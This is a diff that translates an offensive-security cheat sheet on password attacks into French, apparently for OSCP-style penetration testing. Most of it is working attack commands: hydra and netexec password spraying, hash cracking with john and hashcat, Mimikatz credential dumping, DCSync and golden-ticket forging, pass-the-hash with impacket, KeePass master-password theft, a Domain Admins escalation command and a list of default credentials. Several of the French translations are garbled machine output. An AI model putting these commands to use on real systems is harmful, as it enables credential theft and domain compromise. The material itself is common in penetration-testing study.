@@ -49,7 +49,7 @@ hydra -P <password_list> redis://<target_ip>
 ```
 
 
-## Password spraying
+## Pulvérisation du mot de passe
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
@@ -97,10 +97,10 @@ crackmapexec pop3 <target_ip> -u <user_list> -p <password_list> --continue-on-su
 <p class="oscp-command-note">Préparer une empreinte Office pour John.</p>
 
 ```bash
-# Extract hash from encrypted Office files
+# Extraire le hash des fichiers Office chiffrés
 office2john <file> > office.hash
 
-# Crack Office file password using John
+# Mot de passe de fichier Crack Office en utilisant John
 john --wordlist=<wordlist> office.hash
 ```
 
@@ -142,7 +142,7 @@ zip2john <file.zip> > zip.hash
 <p class="oscp-command-note">Analyser des empreintes avec John.</p>
 
 ```bash
-# (Optional), if the zip has too many files, them extract one and crack just that one to speed things up. If given errors delete the --format=zip.
+# (Facultatif), si le zip a trop de fichiers, ils en extraient un et craquent juste celui-là pour accélérer les choses. Si des erreurs sont données, supprimer le --format=zip.
 john zip.hash --wordlist=<wordlist> --format=zip
 # Autre possibilité
 hashcat -m 13600 zip.hash /path/to/wordlist.txt
@@ -152,7 +152,7 @@ hashcat -m 13600 zip.hash /path/to/wordlist.txt
 <p class="oscp-command-note">Vérifier le mot de passe d&#x27;une archive ZIP.</p>
 
 ```bash
-# Perform a brute-force attack on a password-protected ZIP file
+# Effectuer une attaque de force brute sur un fichier ZIP protégé par mot de passe
 fcrackzip -u -D -p <wordlist> <file.zip>
 ```
 
@@ -179,13 +179,7 @@ hydra -l <username> -P <wordlist> <target_ip> http-post-form "/<login_uri>:<user
 
 
 
-```text
-<user_field>=<username>&<pass_field>=^PASS^
-```
-
-
-
-
+<p class="oscp-inline-ref"><strong>Paramètre de formulaire :</strong> <code>&lt;user_field&gt;=&lt;username&gt;&amp;&lt;pass_field&gt;=^PASS^</code></p>
 ```text
 fm_usr=user&fm_pwd=^PASS^
 ```
@@ -224,7 +218,7 @@ hydra -l <username> -P <wordlist> <target_ip> http-get /
 <p class="oscp-command-note">Afficher ou écrire une valeur.</p>
 
 ```bash
-# Calculate keyspace for a password length of <length>
+# Calculer l'espace de touche pour une longueur de mot de passe de <length>
 echo -n "<characters>" | wc -c
 
 python3 -c "print(<keyspace>**<length>)"
@@ -237,7 +231,7 @@ python3 -c "print(<keyspace> / <hash_rate>)"
 <p class="oscp-command-note">Script shell dans la rubrique « Estimer le temps de calcul ».</p>
 
 ```bash
-# Estimate cracking time for a 5-character alphanumeric password
+# Estimation du temps de fissuration pour un mot de passe alphanumérique à 5 caractères
 characters="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 
 echo -n $characters | wc -c  # keyspace
@@ -252,7 +246,7 @@ python3 -c "print(62**5 / 1000000000)"  # example for 1B hashes per second
 <p class="oscp-command-note">Analyser des empreintes avec Hashcat.</p>
 
 ```bash
-# Using Hashcat with rule-based attacks
+# Utilisation de Hashcat avec des attaques basées sur des règles
 hashcat -m <hash_type> <hash_file> <wordlist> -r <rule_file> --force
 ```
 
@@ -271,11 +265,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 
 
-```text
-$1$salt$hash
-```
-
-
+<p class="oscp-inline-ref"><strong>Exemple de format d’empreinte :</strong> <code>$1$salt$hash</code></p>
 **Paramètres et repères :**
 `100` (SHA-1) · `hash:salt`  
 
@@ -320,11 +310,7 @@ $1$salt$hash
 
 
 
-```text
-$2a$10$abcdefghijklmnopqrstuv
-```
-
-
+<p class="oscp-inline-ref"><strong>Exemple de format d’empreinte :</strong> <code>$2a$10$abcdefghijklmnopqrstuv</code></p>
 **Paramètres et repères :**
 `13100` (Kerberos TGS-REP)  
 
@@ -334,11 +320,7 @@ $2a$10$abcdefghijklmnopqrstuv
 
 
 
-```text
-$krb5tgs$23$*user$realm$service*hash
-```
-
-
+<p class="oscp-inline-ref"><strong>Exemple de format d’empreinte :</strong> <code>$krb5tgs$23$*user$realm$service*hash</code></p>
 **Paramètres et repères :**
 `18200` (Kerberos AS-REP)  
 
@@ -348,11 +330,7 @@ $krb5tgs$23$*user$realm$service*hash
 
 
 
-```text
-$krb5asrep$23$user@REALM:hash
-```
-
-
+<p class="oscp-inline-ref"><strong>Exemple de format d’empreinte :</strong> <code>$krb5asrep$23$user@REALM:hash</code></p>
 **Paramètres et repères :**
 `1100` · `username:hash`  
 
@@ -418,11 +396,7 @@ domain\username:hash:salt
 
 
 
-```text
-$1$salt$hash
-```
-
-
+<p class="oscp-inline-ref"><strong>Exemple de format d’empreinte :</strong> <code>$1$salt$hash</code></p>
 **Paramètres et repères :**
 `25600`  
 
@@ -446,11 +420,7 @@ $1$salt$hash
 
 
 
-```text
-$krb5tgs$23$user$realm$service$hash
-```
-
-
+<p class="oscp-inline-ref"><strong>Exemple de format d’empreinte :</strong> <code>$krb5tgs$23$user$realm$service$hash</code></p>
 **Paramètres et repères :**
 `18200` (Kerberos AS-REP)  
 
@@ -460,11 +430,7 @@ $krb5tgs$23$user$realm$service$hash
 
 
 
-```text
-$krb5asrep$23$user@realm:hash
-```
-
-
+<p class="oscp-inline-ref"><strong>Exemple de format d’empreinte :</strong> <code>$krb5asrep$23$user@realm:hash</code></p>
 ## Gestionnaires de mots de passe
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
@@ -473,7 +439,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 <p class="oscp-command-note">Rechercher des fichiers avec PowerShell.</p>
 
 ```powershell
-# Search for KeePass database (.kdbx) on Windows
+# Rechercher la base de données KeePass (.kdbx) sur Windows
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 ```
 
@@ -484,10 +450,10 @@ Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyCont
 # Convert KeePass database to John format
 keepass2john <Database.kdbx> > keepass.hash
 
-# Remember to delete the first "'word':" that says 'Database:'; it should look like this:
+# Rappelez-vous de supprimer le premier "'mot':" qui dit 'Database:'; il devrait ressembler à ceci:
 # $keepass$*2*60*0*d7bfhs83hFTG338717d27a7d4sucgd54fvfv486d2...... INSTEAD OF Database:$keepass$*2*60*0*d7bfhs83hFTG338717d27a7d4sucgd54fvfv486d2......
 
-# Crack KeePass hash using Hashcat (the rule is optional)
+# Crack KeePass hachage en utilisant Hashcat (la règle est facultative)
 hashcat -m 13400 keepass.hash <wordlist> -r <rule_file> --force
 ```
 
@@ -495,19 +461,19 @@ hashcat -m 13400 keepass.hash <wordlist> -r <rule_file> --force
 
 
 ```bash
-# Open the tool
+# Ouvrir l'outil
 kpcli --kdb=Database.kdbx
 
-# Navigate to the desired database and folder with cd [folder]
+# Naviguez dans la base de données et le dossier souhaités avec le cd [folder]
 cd Database/
 
-# Show contents of database
+# Afficher le contenu de la base de données
 ls
 
-# Show entries information
+# Afficher les informations sur les entrées
 show [-f] [-a] <entry_id or entry_path>
 
-# Show a specific field detail of an entry: (example) get 'BACKUP Machine SSH Key' Pass or get 0 Pass
+# Afficher un détail de champ spécifique d'une entrée: (exemple) obtenir 'BACKUP Machine SSH Clé Passer ou obtenir 0 Pass
 get <entry_path or entry_id> <field_name>
 ```
 
@@ -518,7 +484,7 @@ get <entry_path or entry_id> <field_name>
 <p class="oscp-command-note">Modifier les permissions d&#x27;un fichier.</p>
 
 ```bash
-# Set correct permissions for SSH private key
+# Définir les permissions correctes pour la clé privée SSH
 chmod 600 <id_rsa>
 
 # Convert SSH key to John format
@@ -541,9 +507,9 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 <p class="oscp-command-note">Analyser des empreintes avec Hashcat.</p>
 
 ```bash
-# 1. Identify the hash (can use hashes.com to do it), for example: root:$6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.:19453:0:99999:7::: is a SHA-512 because of the $6$ and uses the mode -m 1800.
+# 1. Identifiez le hash (peut utiliser hashes.com pour le faire), par exemple: root:$6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.:19453:0:99999:7::: is a SHA-512 du fait du $6$ et utilise le mode -m 1800.
 
-# 2. Remote the unneeded part, we only need the ':[HASH]:', so in the example above we just need $6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.
+# 2. Remote la partie inutile, nous avons seulement besoin de la ':[HASH]:', donc dans l'exemple ci-dessus nous avons juste besoin de $6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.
 
 # 3. Crack the hash
 hashcat -m 1800 [hash_file].txt [path_to_wordlist]
@@ -566,14 +532,14 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 `lsadump::sam`  
 
 
-**Dumping Password Hashes from SAM**
+**Dumping Password Hashes de SAM**
 
 
 **Paramètres et repères :**
 `lsadump::secrets`  
 
 
-**Dumping Credentials from LSA Secrets**
+**Pouvoirs de dumping de LSA Secrets**
 
 
 **Paramètres et repères :**
@@ -587,7 +553,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 `lsadump::trust`  
 
 
-**Retrieve trust Authentification information.**
+**Récupérer des informations sur l'authentification.**
 
 
 **Paramètres et repères :**
@@ -597,7 +563,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 **Dumping Kerberos Tickets**
 
 
-**Extracts Credentials from LSA**
+**Extraits des lettres de créances de LSA**
 
 
 
@@ -676,7 +642,7 @@ lsadump::sam /system:<SYSTEM> /sam:<SAM>
 ```
 
 
-**Dumping Hashes from Active Directory**
+**Dumping de hashes de Active Directory**
 
 
 
@@ -711,7 +677,7 @@ kerberos::ptt <ticket.kirbi>
 ```
 
 
-**Over-Pass-The-Hash / Pass-The-Key (Kerberos Ticket)**
+**Hors-pass-The-Hash / Pass-The-Key (Billet Kerberos)**
 
 
 
@@ -741,7 +707,7 @@ kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<SE
 ```
 
 
-**Dump Kerberos Tickets for Specific User**
+**Dump Kerberos Tickets pour un utilisateur spécifique**
 
 
 
@@ -768,7 +734,7 @@ kerberos::silver /user:<USERNAME> /domain:<DOMAIN> /target:<SERVER> /rc4:<NTLM_H
 ```
 
 
-**Over-Pass-the-Hash (with RC4)**
+**Surpasser-le-Hash (avec RC4)**
 
 
 
@@ -807,10 +773,10 @@ dpapi::cred /in:<CREDENTIAL_FILE>
 ```powershell
 .\mimikatz.exe "privilege::debug" "[command]" "exit"
 
-# Example for Dumping Passwords (using cmd.exe or PowerShell)
+# Exemple pour les mots de passe de dumping (en utilisant cmd.exe ou PowerShell)
 mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "exit"
 
-# Example for Passing the Hash
+# Exemple pour passer le Hash
 mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:domain.local /rc4:HASH" "exit"
 ```
 
@@ -836,7 +802,7 @@ powershell -enc <encodedCommand>
 <p class="oscp-command-note">Ouvrir une session distante WinRM.</p>
 
 ```powershell
-# Evil-WinRM (we need to connect and then execute it, not possible to send it within the same command)
+# Mauvais-WinRM (nous devons nous connecter et ensuite l'exécuter, impossible de l'envoyer dans la même commande)
 evil-winrm -i [target_ip] -u [username] -p [password]
 mimikatz.exe 'privilege::debug' '[command]' 'exit'
 
@@ -904,7 +870,7 @@ hashcat -m 1000 <NTLM_HASH> /usr/share/wordlists/rockyou.txt -r /usr/share/hashc
 <p class="oscp-command-note">Commande Impacket dans la rubrique « NTLM ».</p>
 
 ```bash
-# Pass-the-Hash using SMBClient
+# Pass-the-Hash en utilisant SMBClient
 impacket-smbclient -hashes <LM_HASH>:<NTLM_HASH> <USERNAME>@<TARGET_IP>
 ```
 
@@ -933,16 +899,16 @@ Hash NTLM: <NTLM_HASH>
 <p class="oscp-command-note">Exécuter une commande distante via SMB.</p>
 
 ```bash
-# Using smbclient
+# Utilisation de smbclient
 impacket-psexec -hashes <LM_HASH>:<NTLM_HASH> <USERNAME>@<TARGET_IP>
 
-# Using PsExec
+# Utilisation de PsExec
 impacket-psexec -hashes <LM_HASH>:<NTLM_HASH> <USERNAME>@<TARGET_IP>
 
-# Using WMIExec
+# Utilisation de WMIExec
 impacket-wmiexec -hashes <LM_HASH>:<NTLM_HASH> <USERNAME>@<TARGET_IP>
 
-# Using xfreerdp
+# Utilisation de xfreerdp
 xfreerdp /v:<target_ip> /u:<USERNAME> /pth:<NTLM_HASH> /size:<resolution>
 ```
 
@@ -1071,7 +1037,7 @@ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 <p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>
 
 ```bash
-# The port should match the port specified in the reverse shell command
+# Le port doit correspondre au port spécifié dans la commande shell inverse
 nc -nvlp [port]
 ```
 
@@ -1079,12 +1045,12 @@ nc -nvlp [port]
 
 
 ```powershell
-# <responder_ip>: IP address of the machine running the Responder server.
+# <responder_ip>: Adresse IP de la machine exécutant le serveur Responder.
 C:\Windows\system32> dir \\<responder_ip>\test
 ```
 
 
-## Default Credentials
+## Pouvoirs par défaut
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
@@ -1104,7 +1070,7 @@ sudo pip3 install defaultcreds-cheat-sheet
 ```bash
 creds search [service/web_server/term]
 
-# Example:
+# Exemple :
 creds search tomcat
 +----------------------------------+------------+------------+
 | Product                          |  username  |  password  |
@@ -1126,13 +1092,13 @@ creds update
 
 
 ```bash
-# Search for product creds
+# Recherche de produits creds
 creds search [service/web_server/term] --proxy=http://localhost:8080
 
 # update records
 creds update --proxy=http://localhost:8080
 
-# Example: Search for Tomcat creds and export results to /tmp/tomcat-usernames.txt , /tmp/tomcat-passwords.txt
+# Exemple : Rechercher des creds Tomcat et les résultats d'exportation vers /tmp/tomcat-usernames.txt , /tmp/tomcat-passwords.txt
 creds search tomcat --proxy=http://localhost:8080 export
 ```
 
@@ -1145,14 +1111,14 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 
 ```text
-# Commonly guessed or default credentials
+# Titres de créance généralement devinés ou par défaut
 root:root                # Default root credentials
 admin@example.com:admin  # Common admin credentials for email accounts
 admin:admin              # Standard admin/admin credentials
 USERK:USERK              # Credentials matching the box name (e.g., a target machine's name)
 cassie:cassie            # Credentials found using exiftool or similar methods
 
-# Additional Default Credentials
+# Pouvoirs additionnels par défaut
 admin:password           # Standard admin/password credentials
 admin:1234               # Admin credentials with simple numeric password
 administrator:admin      # Default admin credentials for Windows systems
@@ -1169,7 +1135,7 @@ mysql:mysql              # Default MySQL credentials
 ```
 
 
-### Strategies for Effective Password Guessing
+### Stratégies pour une interprétation efficace du mot de passe
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
@@ -1187,37 +1153,17 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 
 
-```text
-/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
-```
-
-
-```text
-/usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt
-```
-
-
-```text
-/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
-```
-
-
-```text
-/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-```
-
-
+<p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt</code></p>
+<p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>/usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt</code></p>
+<p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt</code></p>
+<p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></p>
 **Paramètres et repères :**
 `/usr/share/dirb/wordlists/common.txt` · `/usr/share/dirb/wordlists/big.txt`  
 
 
 
 
-```text
-/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt
-```
-
-
+<p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt</code></p>
 ### Énumération
 
 
@@ -1325,7 +1271,7 @@ netexec smb target -u [username] -p 'password with spaces'
 
 
 ```bash
-# Using Passwords
+# Utilisation des mots de passe
 netexec [protocol] [target(s)] -u [usernames].txt -p [passwords].txt
 
 netexec [protocol] [target(s)] -u [usernames].txt -p [passwords].txt --local-auth
@@ -1334,7 +1280,7 @@ netexec [protocol] [target(s)] -u username1 -p password1 password2
 
 netexec [protocol] [target(s)] -u username1 username2 -p password1
 
-# Using NTLM Hashes
+# Utilisation de NTLM Haches
 netexec [protocol] [target(s)] -u [usernames].txt -H [ntlm_hashes].txt
 
 netexec [protocol] [target(s)] -u [usernames].txt -H [ntlm_hashes].txt --local-auth
@@ -1371,7 +1317,7 @@ netexec smb target -u [username] -p '[password]' --local-auth
 netexec smb [target] -u [username] -H '[LM:NT]' --local-auth
 netexec smb [target] -u [username] -H '[NTHASH]' --local-auth
 
-# Examples
+# Exemples
 netexec smb [target] -u '' -p '' --local-auth
 netexec smb [target] -u localguy -H '13b29964cc2480b4ef454c59562e675c' --local-auth
 netexec smb [target] -u localguy -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c' --local-auth
@@ -1505,7 +1451,7 @@ nxc smb target -u [username] -p [password] --sam
 ```bash
 netexec smb target -u [username] -p [password] --local-auth --lsa
 
-# If you found an account starting with _SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7} you can get the account behind, by using gMSA below.
+# Si vous avez trouvé un compte commençant par  SC GMSA {84A78B8C-56EE-465b-8496-FFB35A1B52A7}, vous pouvez récupérer le compte en utilisant gMSA ci-dessous.
 ```
 
 
@@ -1517,13 +1463,13 @@ netexec smb target -u [username] -p [password] --ntds
 
 
 ```bash
-# Using Lsassy
+# Utilisation de Lsassey
 nxc smb target -u [username] -p [password] -M lsassy
 
-# Using nanodump
+# Utilisation de nanodump
 nxc smb target -u [username] -p [password] -M nanodump
 
-# Using Mimikatz (deprectaed): you need at least local admin privilege on the remote target, use option --local-auth if your user is a local account
+# Utilisation de Mimikatz (déprécié) : vous avez besoin d'au moins un privilège d'administration local sur la cible distante, utilisez l'option --local-auth si votre utilisateur est un compte local
 nxc smb target -u [username] -p [password] -M mimikatz -o COMMAND='"lsadump::dcsync /domain:domain.local /user:krbtgt"
 ```
 
@@ -1566,7 +1512,7 @@ netexec smb [target] -u [username] -p [password] -M wifi
 
 
 ```bash
-# You can check if keepass is installed on the target computer and then steal the master password and decrypt the database
+# Vous pouvez vérifier si keepass est installé sur l'ordinateur cible, puis voler le mot de passe maître et déchiffrer la base de données
 nxc smb [target] -u [username] -p [password] -M keepass_discover
 
 nxc smb [target] -u [username] -p [password] -M keepass_trigger -o KEEPASS_CONFIG_PATH="path_from_module_discovery"
@@ -1656,7 +1602,7 @@ netexec ldap [target] -u [username] -p [password] -M ldap-checker
 ```
 
 
-#### Check if the DC is vulnerable to zerologon, petitpotam, nopac
+#### Vérifiez si le DC est vulnérable à zérologon, petitpotam, nopac
 
 
 <p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
@@ -1670,7 +1616,7 @@ netexec smb [target] -u [username] -p [password] -M nopac
 ```
 
 
-#### Check the MachineAccountQuota
+#### Vérifiez la machineAccountQuota
 
 
 <p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
@@ -1690,7 +1636,7 @@ netexec ldap [target] -u [username] -p [password] -M adcs
 ```
 
 
-#### Retrieve MSOL Account Password
+#### Récupération MSOL Mot de passe du compte
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
@@ -1710,7 +1656,7 @@ netexec smb [target] -u [username] -p [password] -M msol
 ```bash
 netexec smb [target(s)] --gen-relay-list relay.txt
 
-# Alternative with Nmap
+# Alternative avec Nmap
 nmap --script smb-security-mode.nse,smb2-security-mode.nse -p445 [target(s)]
 
 # Expected Results
@@ -1753,7 +1699,7 @@ nxc smb [target] -u [localAdmin] -p [password] --loggedon-users
 ```bash
 nxc smb [target] -u [localAdmin] -p [password] -M schtask_as -o USER=[logged-on-user] CMD=[cmd-command]
 
-# Custom command to add a user to the domain admin group: powershell.exe \"Invoke-Command -ComputerName [DC_NAME] -ScriptBlock {Add-ADGroupMember -Identity 'Domain Admins' -Members USER.NAME}\"
+# Commande personnalisée pour ajouter un utilisateur au groupe d'administration de domaine : powershell.exe \"Invoke-Command -ComputerName [DC_NAME] -ScriptBlock {Add-ADGroupMember -Identity 'Domain Admins' -Members USER.NAME}\"
 ```
 
 ![Impersonate Logged In Users with NetExec.](https://www.emmanuelsolis.com/img/netexec_01.png)
@@ -1799,14 +1745,14 @@ python3 script.py -u [users_list].txt -d [domains_list].txt
 import argparse
 
 def main():
-    # Set up argument parsing
+    # Configurer l'analyse des arguments
     parser = argparse.ArgumentParser(description="Generate combinations of domains and users.")
     parser.add_argument("-d", "--domain", required=True, help="Path to the domains file")
     parser.add_argument("-u", "--users", required=True, help="Path to the users file")
     parser.add_argument("-o", "--output", default="output.txt", help="Output file name (default: output.txt)")
     args = parser.parse_args()
 
-    # Read the domains and users from the provided files
+    # Lire les domaines et les utilisateurs à partir des fichiers fournis
     try:
         with open(args.domain, "r") as domains_file:
             domains = [line.strip() for line in domains_file.readlines()]
@@ -1820,7 +1766,7 @@ def main():
     # Generate combinations
     combinations = [f"{domain}\\{user}" for user in users for domain in domains]
 
-    # Write the combinations to the output file
+    # Écrivez les combinaisons dans le fichier de sortie
     with open(args.output, "w") as output_file:
         output_file.write("\n".join(combinations))
 
